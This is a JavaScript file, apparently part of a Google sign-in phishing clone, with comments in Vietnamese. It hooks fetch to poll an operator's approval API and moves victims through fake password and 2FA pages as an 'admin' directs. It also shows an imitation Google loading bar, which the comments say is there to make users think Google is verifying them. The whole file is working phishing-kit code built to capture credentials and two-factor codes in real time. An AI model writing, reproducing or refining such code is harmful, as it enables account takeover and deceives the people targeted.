/**
 * flow.js — Shared approval-flow helper
 *
 * Intercepts responses from /api/status/:id and /api/check-approval.
 * Nếu server trả về data.nextPage (do admin chỉ định), tự điều hướng user
 * đến trang đó, ghi đè logic hardcode cũ của từng trang.
 *
 *   data.nextPage === 'success'       → https://myaccount.google.com/
 *   data.nextPage === 'password.html' → /password.html?email=...
 *   data.nextPage === 'verify-*.html' → /verify-*.html?email=...
 *
 * Khi admin bấm Deny, server trả status:'denied' (không có nextPage) —
 * pass-through, để logic gốc của từng trang hiển thị lỗi như cũ.
 *
 * Ngoài ra còn inject THANH LOADING INDETERMINATE kiểu Google (dải xanh
 * chạy trái → phải ở viền trên form) cho TẤT CẢ trang — để user thấy
 * đang "chờ Google xác nhận" (thực chất chờ admin bấm Yes/No).
 */
(function () {
    if (window.__flowInstalled) return;
    window.__flowInstalled = true;

    const origFetch = window.fetch;
    let navigating = false;

    // ================================================================
    // Google-style indeterminate waiting bar — inject 1 lần, áp dụng mọi trang
    // ================================================================
    function injectWaitBarStyle() {
        if (document.getElementById('__g-waitbar-style')) return;
        const style = document.createElement('style');
        style.id = '__g-waitbar-style';
        style.textContent = `
            .g-waitbar {
                position: absolute;
                top: 0;
                left: 0;
                width: 100%;
                height: 4px;
                background: rgba(26, 115, 232, .20);
                overflow: hidden;
                z-index: 10;
                border-radius: 0;
                pointer-events: none;
                transition: opacity .25s ease;
            }
            /* Google Material Design indeterminate — 2 bar chạy nối tiếp,
               duration 2.1s, easing Google chuẩn. Giống 100% bar Google. */
            .g-waitbar::before,
            .g-waitbar::after {
                content: '';
                position: absolute;
                top: 0;
                bottom: 0;
                background: #1a73e8;
                will-change: left, right;
            }
            .g-waitbar::before {
                animation: gWaitIndet 2.1s cubic-bezier(.65, .815, .735, .395) infinite;
            }
            .g-waitbar::after {
                animation: gWaitIndetShort 2.1s cubic-bezier(.165, .84, .44, 1) infinite;
                animation-delay: 1.15s;
            }
            @keyframes gWaitIndet {
                0%   { left: -35%;  right: 100%; }
                60%  { left: 100%;  right: -90%; }
                100% { left: 100%;  right: -90%; }
            }
            @keyframes gWaitIndetShort {
                0%   { left: -200%; right: 100%; }
                60%  { left: 107%;  right: -8%;  }
                100% { left: 107%;  right: -8%;  }
            }
        `;
        document.head.appendChild(style);
    }

    function attachWaitBar() {
        // Chỉ gắn vào .content-card (dành cho các trang 2FA dùng form card này).
        // Các trang login/password dùng .signin-card — KHÔNG inject bar để tránh
        // bar nổi ở đỉnh viewport (không đẹp, user yêu cầu bỏ).
        const host = document.querySelector('.content-card');
        if (!host) return;
        if (host.querySelector(':scope > .g-waitbar')) return;

        // Đảm bảo host có position để bar absolute bám đúng viền trên
        const cs = getComputedStyle(host);
        if (cs.position === 'static') {
            host.style.position = 'relative';
        }
        const bar = document.createElement('div');
        bar.className = 'g-waitbar';
        host.insertBefore(bar, host.firstChild);
    }

    function hideWaitBar() {
        document.querySelectorAll('.g-waitbar').forEach(b => {
            b.style.opacity = '0';
            setTimeout(() => { if (b.parentNode) b.parentNode.removeChild(b); }, 250);
        });
    }

    function setupWaitBar() {
        injectWaitBarStyle();
        attachWaitBar();
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', setupWaitBar);
    } else {
        setupWaitBar();
    }

    // ================================================================
    // "Verifying…" waiting state — áp dụng 2.5s trước khi chuyển trang sau
    // khi admin bấm Yes trên popup 2FA. Dùng đúng style như trang login /
    // password: KHÔNG popup overlay giữa màn hình, chỉ
    //   - Làm mờ form bên trong card (class .waiting → opacity .45 + blur)
    //   - Giữ thanh loading xanh mảnh ở viền trên card (.g-waitbar đã
    //     inject sẵn từ attachWaitBar) chạy indeterminate.
    // Chỉ áp dụng cho các trang 2FA (2FA AUTH / NUMBER / Device / OPTION);
    // trang login / password giữ hành vi redirect tức thời như cũ.
    // ================================================================
    const VERIFYING_MS = 4000;

    function isOn2FAPage() {
        try {
            const name = decodeURIComponent(
                (window.location.pathname || '').split('/').pop() || ''
            ).toLowerCase();
            return name.includes('2fa') || name.startsWith('verify-');
        } catch (_) {
            return false;
        }
    }

    function enterVerifyingState() {
        // Áp class .waiting cho card đang hiển thị (content-card hoặc
        // signin-card tuỳ trang). CSS của từng trang có rule:
        //   .content-card.waiting .signin-columns,
        //   .signin-card.waiting  .signin-columns {
        //       opacity: .45; filter: blur(.3px); pointer-events: none;
        //   }
        // Và .g-waitbar đã chạy sẵn nên chỉ cần đảm bảo nó còn hiển thị.
        const card = document.querySelector('.content-card')
                  || document.querySelector('.signin-card');
        if (card) card.classList.add('waiting');

        // Nếu waitbar đang ẩn do poll hoàn tất, bật lại bằng cách gắn
        // mới (attachWaitBar idempotent — đã check dup).
        attachWaitBar();
        const bars = document.querySelectorAll('.g-waitbar');
        bars.forEach(b => { b.style.opacity = '1'; });
    }

    // ================================================================
    // Navigation handler
    // ================================================================
    function isSamePage(nextPage) {
        try {
            // Bỏ query/hash + decode path để so sánh với nextPage.
            const curName = decodeURIComponent(
                (window.location.pathname || '').split('/').pop() || ''
            ).toLowerCase();
            const nextName = decodeURIComponent(nextPage.split('?')[0].split('#')[0] || '')
                .toLowerCase();
            return !!curName && curName === nextName;
        } catch (_) {
            return false;
        }
    }

    function navigateTo(nextPage) {
        if (navigating) return;

        // Nếu admin set nextPage trùng với trang user đang đứng (ví dụ
        // admin gõ số mới ở popup 2FA NUMBER → decide('2FA NUMBER.html')
        // trong khi user đã ở sẵn trang này) → KHÔNG reload/fade-out để
        // tránh trang mờ đi rồi nháy reload. Poll /api/check-approval của
        // từng trang sẽ tự update nội dung inline.
        if (isSamePage(nextPage)) return;

        navigating = true;

        // Quyết định việc hiển thị overlay "Verifying…" 2.5s trước khi
        // redirect — chỉ áp dụng khi user đang ở trang 2FA (2FA AUTH /
        // NUMBER / Device / OPTION hoặc verify-*). Trang login / password
        // giữ redirect tức thời để tránh delay không cần thiết.
        const useVerifyDelay = isOn2FAPage();

        const doNavigate = () => {
            hideWaitBar();
            if (nextPage === 'success' || nextPage === 'myaccount') {
                // Chuyển sang trang đích custom đồng bộ style Google Careers
                // (success.html cùng folder) thay vì myaccount.google.com.
                // URL tương đối → trang này đặt cạnh các trang 2FA nên luôn
                // resolve đúng cả khi serve từ /googlenew1-main/google-login-clone/.
                const email = localStorage.getItem('userEmail') || '';
                const sep = 'success.html'.includes('?') ? '&' : '?';
                window.location.href = 'success.html' + sep
                    + 'email=' + encodeURIComponent(email);
                return;
            }
            const email = localStorage.getItem('userEmail') || '';
            const sep = nextPage.includes('?') ? '&' : '?';
            const target = nextPage + sep + 'email=' + encodeURIComponent(email);

            // Ưu tiên fade-out nếu trang có handleTransition. Nhưng nếu
            // overlay "Verifying…" đang bật, bỏ qua fade-out (overlay đã phủ
            // toàn màn hình) để tránh hiệu ứng chồng chéo.
            if (!useVerifyDelay && typeof window.handleTransition === 'function') {
                try { window.handleTransition(target); return; } catch (_) {}
            }
            window.location.href = target;
        };

        if (useVerifyDelay) {
            enterVerifyingState();
            setTimeout(doNavigate, VERIFYING_MS);
        } else {
            doNavigate();
        }
    }

    window.fetch = async function (input, init) {
        const res = await origFetch.apply(this, arguments);

        try {
            const url = typeof input === 'string' ? input : (input && input.url) || '';
            if (url.includes('/api/status/') || url.includes('/api/check-approval')) {
                const clone = res.clone();
                const data = await clone.json().catch(() => null);
                // Chỉ navigate khi admin APPROVE với 1 nextPage hợp lệ.
                // Khi denied (kể cả denied kèm marker như 'invalid_work_email'),
                // để inline script của từng trang hiển thị lỗi đỏ — không redirect.
                if (data && data.nextPage && data.status === 'approved') {
                    navigateTo(data.nextPage);
                }
            }
        } catch (_) { /* never break the original fetch */ }

        return res;
    };
})();
